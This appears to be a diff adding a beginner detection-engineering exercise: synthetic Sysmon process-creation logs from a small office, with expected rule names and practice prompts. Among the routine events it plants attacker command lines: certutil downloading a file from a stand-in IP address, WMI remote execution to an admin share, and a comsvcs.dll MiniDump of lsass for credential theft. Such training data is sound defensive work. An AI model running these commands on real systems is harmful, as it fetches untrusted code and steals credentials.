@@ -1,0 +1,137 @@
+slug: windows-process-execution
+name: Windows process execution
+description: >
+  An hour of Sysmon process-creation events from a small office network: ordinary logons, browsers,
+  updaters and Office, with a handful of living-off-the-land executions hidden in the noise.
+  Practise separating a suspicious parent-child chain from routine software.
+source_type: Sysmon Event ID 1 (process creation), Windows
+difficulty: beginner
+mitre: [T1059.003, T1204.002, T1047, T1003.001, T1105]
+expected_rules:
+  - win-office-application-spawns-shell
+  - win-certutil-urlcache-download
+  - win-wmi-spawned-shell
+  - win-lsass-memory-dump-command-line
+try_this:
+  - "Run the Office rule and open the match trace: which selection needs the parent, and which the child?"
+  - Change the Office rule's parent list and see which events stop matching.
+  - Write a rule for certutil that ignores its documented certificate-management uses.
+events:
+  # Ordinary desktop activity on three workstations
+  - t: 0
+    repeat: 12
+    every: 240
+    category: process_creation
+    host: WKS-021
+    user: 'CORP\asmith'
+    fields:
+      Image: 'C:\Program Files\Google\Chrome\Application\chrome.exe'
+      ParentImage: 'C:\Windows\explorer.exe'
+      CommandLine: '"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Profile {i}"'
+      IntegrityLevel: Medium
+  - t: 30
+    repeat: 10
+    every: 300
+    category: process_creation
+    host: WKS-022
+    user: 'CORP\bjones'
+    fields:
+      Image: 'C:\Windows\System32\svchost.exe'
+      ParentImage: 'C:\Windows\System32\services.exe'
+      CommandLine: 'C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule'
+      IntegrityLevel: System
+  - t: 45
+    repeat: 8
+    every: 420
+    category: process_creation
+    host: WKS-023
+    user: 'CORP\cdavis'
+    fields:
+      Image: 'C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE'
+      ParentImage: 'C:\Windows\explorer.exe'
+      CommandLine: '"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "C:\Users\cdavis\Documents\report-{i}.xlsx"'
+      IntegrityLevel: Medium
+  - t: 90
+    repeat: 6
+    every: 540
+    category: process_creation
+    host: WKS-021
+    user: 'CORP\asmith'
+    fields:
+      Image: 'C:\Windows\System32\cmd.exe'
+      ParentImage: 'C:\Windows\explorer.exe'
+      CommandLine: 'cmd.exe /c ipconfig /all'
+      IntegrityLevel: Medium
+  - t: 200
+    repeat: 4
+    every: 800
+    category: process_creation
+    host: WKS-022
+    user: 'CORP\bjones'
+    fields:
+      Image: 'C:\Windows\System32\certutil.exe'
+      ParentImage: 'C:\Windows\System32\mmc.exe'
+      CommandLine: 'certutil.exe -store My'
+      IntegrityLevel: Medium
+    note: Legitimate certutil use. The rule looks for urlcache, not the tool itself.
+
+  # 1. A macro-enabled document starts a shell
+  - t: 1500
+    category: process_creation
+    host: WKS-023
+    user: 'CORP\cdavis'
+    fields:
+      Image: 'C:\Windows\System32\cmd.exe'
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE'
+      CommandLine: 'cmd.exe /c whoami /all'
+      IntegrityLevel: Medium
+    note: Excel starting a command shell. A spreadsheet does not normally need one.
+
+  # 2. certutil used as a downloader
+  - t: 1512
+    category: process_creation
+    host: WKS-023
+    user: 'CORP\cdavis'
+    fields:
+      Image: 'C:\Windows\System32\certutil.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.24/tool.bin C:\Users\cdavis\AppData\Local\Temp\tool.bin'
+      IntegrityLevel: Medium
+    note: A signed Windows binary fetching a file from a documentation-range address.
+
+  # 3. A remote command through WMI
+  - t: 2100
+    category: process_creation
+    host: SRV-FILE01
+    user: 'NT AUTHORITY\SYSTEM'
+    fields:
+      Image: 'C:\Windows\System32\cmd.exe'
+      ParentImage: 'C:\Windows\System32\wbem\WmiPrvSE.exe'
+      CommandLine: 'cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\__1700000000.1 2>&1'
+      IntegrityLevel: System
+    note: "The shape of remote command execution over WMI: output redirected to an admin share."
+
+  # 4. Credential-dumping command line
+  - t: 2900
+    category: process_creation
+    host: SRV-FILE01
+    user: 'NT AUTHORITY\SYSTEM'
+    fields:
+      Image: 'C:\Windows\System32\rundll32.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\d.dmp full'
+      IntegrityLevel: System
+    note: A memory dump of process 704, written to a temp folder. On a real host 704 would be lsass.exe.
+
+  # More background after the incident window
+  - t: 3000
+    repeat: 10
+    every: 45
+    category: process_creation
+    host: WKS-021
+    user: 'CORP\asmith'
+    fields:
+      Image: 'C:\Windows\System32\conhost.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'conhost.exe 0xffffffff -ForceV1'
+      IntegrityLevel: Medium
